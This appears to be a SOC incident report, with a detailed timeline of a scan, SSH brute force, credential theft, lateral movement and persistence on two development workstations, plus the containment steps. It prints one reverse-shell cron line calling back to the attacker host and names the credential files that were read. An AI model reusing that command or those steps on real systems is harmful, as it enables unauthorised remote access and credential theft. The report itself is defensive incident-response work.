# Incident Report: INC-2026-07-08-001 — Full Kill Chain Compromise of VLAN Dev
 
---
 
## 1. Executive Summary
 
On July 8, 2026, a critical-severity intrusion was detected targeting workstations in the Development VLAN (VLAN 20). The attack originated from the adversary DMZ (VLAN 66) and resulted in the compromise of user account `arodriguez` on host `ws-dev-02`, followed by lateral movement to a second workstation (`WS-DEV-01`) using credentials harvested from the initial foothold.
 
The attacker progressed through reconnaissance, credential harvest, lateral movement, and persistence phases over an approximately 120-minute window. Compromised assets include the `arodriguez` account credentials on ws-dev-02, a private SSH key granting access to WS-DEV-01, and credential material from environment configuration files. Persistence was established on both compromised hosts via cron entries and SSH authorized_keys modifications.
 
The incident was contained by isolating the affected hosts, rotating compromised credentials, and removing the persistence artefacts. Post-incident detection engineering work produced nine custom Wazuh rules mapped to the observed MITRE ATT&CK techniques; these rules were validated against replayed attack telemetry and would have detected the intrusion at significantly earlier stages, materially reducing the observed dwell time. Full recommendations for infrastructure, detection, and response process improvements are detailed in Section 10.

## 3. Timeline of Events
 
The following timeline reconstructs the incident from the attacker's first observable action to the completion of eradication procedures. Timestamps are recorded in CEST (UTC+2) and were reconstructed from pfSense firewall logs, Wazuh alerts, auditd events on the affected hosts, and SSH authentication records. At the time of the incident, the SIEM was operating with the Wazuh built-in ruleset only, the custom detection rules referenced in Section 5 were developed as a post-incident deliverable and were not available during the events described below.
 
| Timestamp | Attacker Actions | Defender Observations |
|-----------|------------------|-----------------------|
| 15:00 CEST | A TCP SYN scan was initiated from 10.10.66.10 against the VLAN 10 (Corp) and VLAN 20 (Dev) subnets, targeting ten common service ports (22, 80, 443, 3306, 3389, 445, 5985, 8080, 8443, 9090). | pfSense began emitting block events at high volume. Approximately 34,828 firewall block alerts were generated across a 4-minute window, each classified at level 3 (informational). No aggregation rule was in place to promote the pattern to a higher severity, and no operator was actively reviewing the alerts feed. |
| 15:04 CEST | The reconnaissance scan completed. The attacker identified TCP/22 (SSH) and TCP/3389 (RDP) open on 10.10.20.20 (ws-dev-02) and TCP/3389 (RDP) on 10.10.20.10 (WS-DEV-01). | No detection. The scan pattern was fully visible in the raw alerts index but not surfaced by any active rule. |
| 15:05 CEST | Hydra was launched against 10.10.20.20 with username `arodriguez` and a common-password wordlist (rockyou.txt), performing SSH authentication attempts at approximately 4 threads. | Wazuh built-in rules 5710 (SSH authentication failure) and 5716 (multiple authentication failures) fired repeatedly, producing approximately 3,027 authentication failure alerts within 45 seconds across three parallel built-in rules. Rule 5712 (possible SSH brute force) triggered but was not prioritised in the analyst dashboard. |
| 15:06 CEST | Hydra recovered the password `summer2024` for the `arodriguez` account. The attacker terminated the brute force. | Rule 5716 fired as expected during the burst, but no compound rule existed to correlate failed authentication events with a subsequent success. |
| 15:07 CEST | An interactive SSH session was opened from 10.10.66.10 to ws-dev-02 as `arodriguez`. The Wazuh built-in rule 5715 (SSH authentication success) fired. | The successful authentication event was logged and visible in the alerts index. However, no rule correlated the success with the immediately preceding brute force burst, so the compromise indicator was not elevated to a compound alert. |
| 15:08 CEST | The attacker executed a discovery command sequence on ws-dev-02: `whoami`, `id`, `uname -a`, `w`, `ps auxf`, `ss -tulpn`, `ip a`, `crontab -l`. Eight commands executed in under 60 seconds. | auditd was not configured with execve watches for reconnaissance commands. The command sequence generated no SIEM alerts. |
| 15:09 CEST | Credential harvesting was performed on ws-dev-02 via `cat` against `/home/arodriguez/.env`, `/home/arodriguez/notes.txt` and `/home/arodriguez/.ssh/service_key`. Extracted material included plaintext database credentials, an API key, an SSH private key intended for lateral access to WS-DEV-01, and password fragments from historical shell activity. | auditd was not configured with file watches on credential-bearing paths. The four `cat` operations generated no SIEM alerts. |
| 15:11 CEST | Using the harvested SSH private key, the attacker established an SSH connection from ws-dev-02 to WS-DEV-01 as user `khernandez`. An SSH local port forward was configured to tunnel RDP traffic to WS-DEV-01. | The internal SSH session from ws-dev-02 (10.10.20.20) to WS-DEV-01 (10.10.20.10) traversed the same VLAN and was allowed by segmentation policy. Wazuh built-in rule 5715 fired on WS-DEV-01 for the successful key-based authentication. No rule flagged the anomalous origin. |
| 15:12 CEST | — | The SOC L1 analyst on shift began an ad-hoc review of the alert queue after noticing an unusually high alert volume from ws-dev-02 in the "Top Agents" widget. The 3,027 authentication failure alerts from the earlier hydra burst were the first visible indicator of the incident. |
| 15:15 CEST | The attacker completed the RDP session setup via xfreerdp through the tunnel. Interactive access to WS-DEV-01 as `khernandez` was established. | The RDP connection over the SSH tunnel produced no additional SIEM signal — the outer SSH session was already authenticated and the inner RDP traffic was encapsulated. |
| 15:20 CEST | Persistence was installed on ws-dev-02: a cron entry executing `bash -i >& /dev/tcp/10.10.66.10/4444 0>&1` every 10 minutes was appended to the user crontab of `arodriguez`. | auditd was not configured with watches on cron configuration paths. The crontab modification generated no SIEM alert. |
| 15:22 CEST | Persistence was installed on WS-DEV-01: the attacker's SSH public key was appended to `/home/khernandez/.ssh/authorized_keys`, granting passwordless SSH access on subsequent sessions. | No file integrity monitoring was configured for SSH authorized_keys files. The persistence modification generated no SIEM alert. |
| 15:25 CEST | The attacker terminated all interactive sessions, leaving the two persistence mechanisms as the sole remaining footholds. | — |
| 15:12 – 16:45 CEST | — | The SOC L1 analyst continued triage of the alert cluster from ws-dev-02. The high volume of low-severity events required manual pivoting across pfSense blocks, authentication failures, and successful logins to reconstruct the attack sequence. |
| 16:45 CEST | — | The analyst confirmed the intrusion as a real compromise after correlating the timing of successful SSH login on ws-dev-02 with the source IP of the preceding brute force. Incident INC-2026-07-08-001 was declared. |
| 16:50 CEST | — | The SOC L2 on call was notified. Initial scope assessment identified both ws-dev-02 and WS-DEV-01 as affected based on the lateral movement observed in the built-in SSH authentication success alerts. |
| 17:00 CEST | — | **Containment initiated.** A pfSense firewall rule was deployed blocking all traffic between VLAN 66 and VLAN 20 (and inbound to VLAN 66) to prevent the attacker from re-entering via any remaining channel. The `arodriguez` and `khernandez` accounts were disabled at the local user level. Both hosts were snapshotted for forensic preservation before further changes. |
| 17:15 CEST | — | Active SSH sessions on both hosts were terminated. Passwords for `arodriguez` and `khernandez` were rotated. The compromised SSH service key was revoked and removed. |
| 17:30 CEST | — | Forensic examination of ws-dev-02 began. The analyst inspected the user crontab of `arodriguez` using `crontab -l` and discovered the reverse shell entry pointing to `10.10.66.10:4444`. |
| 17:45 CEST | — | Forensic examination of WS-DEV-01 identified the attacker-controlled public key appended to `/home/khernandez/.ssh/authorized_keys`. The key fingerprint was recorded as an IoC. |
| 18:00 CEST | — | **Eradication began.** The reverse shell cron entry was removed from `arodriguez`'s crontab. The unauthorised public key was removed from `khernandez`'s authorized_keys. Both files were checksummed against known-good baselines. |
| 18:15 CEST | — | Full audit of both hosts confirmed no additional persistence mechanisms (systemd units, kernel modules, additional user accounts, or scheduled tasks). Baseline integrity checks completed for `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, and `.ssh/authorized_keys` across all monitored users. |
| 18:30 CEST | — | **Eradication completed.** The pfSense containment rule remained active as a precaution. The analyst prepared the initial incident summary for handoff to the post-incident review process. |
